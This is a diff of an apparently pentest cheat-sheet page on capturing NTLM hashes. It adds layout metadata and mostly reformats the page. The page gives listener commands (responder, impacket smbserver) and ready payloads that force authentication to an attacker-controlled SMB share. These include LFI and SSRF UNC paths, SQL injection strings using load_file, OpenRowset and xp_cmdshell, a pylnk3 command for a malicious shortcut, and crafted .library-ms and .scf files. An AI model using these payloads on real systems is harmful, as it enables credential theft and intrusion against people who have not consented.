@@ -1,17 +1,31 @@
 ---
 icon: ear
+layout:
+  width: default
+  title:
+    visible: true
+  description:
+    visible: false
+  tableOfContents:
+    visible: true
+  outline:
+    visible: false
+  pagination:
+    visible: false
+  metadata:
+    visible: false
 ---
 
-# Stealing NTLM hashes
+# Capturing NTLM
 
 ## Listener
 
-```bash
+```sh
 sudo responder -I <interface>
 ```
 
-```
-impacket-smbserver share /dev/null -smb2support
+```sh
+smbserver.py share /dev/null -smb2support
 ```
 
 ## Possible Attacks
@@ -20,17 +34,18 @@ impacket-smbserver share /dev/null -smb2support
 
 If you discover a web vulnerability (such as LFI, SQLI, XXE, SSRF, SSTI) that allows you to include remote files, you can exploit it to steal the NTLM hash of the user running the process. For example:
 
-<pre class="language-powershell"><code class="lang-powershell"># LFI
-?page=\\&#x3C;attaker>\shared
+```sh
+# LFI
+?page=\\<attaker>\shared
 
 # SSRF
-?url=file:////&#x3C;attaker>/shared
+?url=file:////<attaker>/shared
 
 # SQL Injection
-?id=1' union select null,load_file('\\\\&#x3C;attaker>\\shared'),null-- -
-?id=1' union select null,(select x from OpenRowset(BULK '\\&#x3C;attaker>\shared',SINGLE_CLOB) R(x)),null-- -
-<strong>?id=1' union select null,(EXEC xp_cmdshell 'dir \\&#x3C;attaker>\shared'),null-- -
-</strong></code></pre>
+?id=1' union select null,load_file('\\\\<attaker>\\shared'),null-- -
+?id=1' union select null,(select x from OpenRowset(BULK '\\<attaker>\shared',SINGLE_CLOB) R(x)),null-- -
+?id=1' union select null,(EXEC xp_cmdshell 'dir \\<attaker>\shared'),null-- -
+```
 
 ### Via .library-ms file
 
@@ -51,7 +66,7 @@ EOF
 
 ### Via .lnk file
 
-```powershell
+```sh
 pylnk3 c '\\<attacker>\shared' \!shared.lnk -i '\\<attacker>\shared\icon.ico'
 ```
 
@@ -77,7 +92,3 @@ IconFile=\\\\<attacker>\\shared\\icon.ico
 Command=ToggleDesktop
 EOF
 ```
-
-## References
-
-[https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
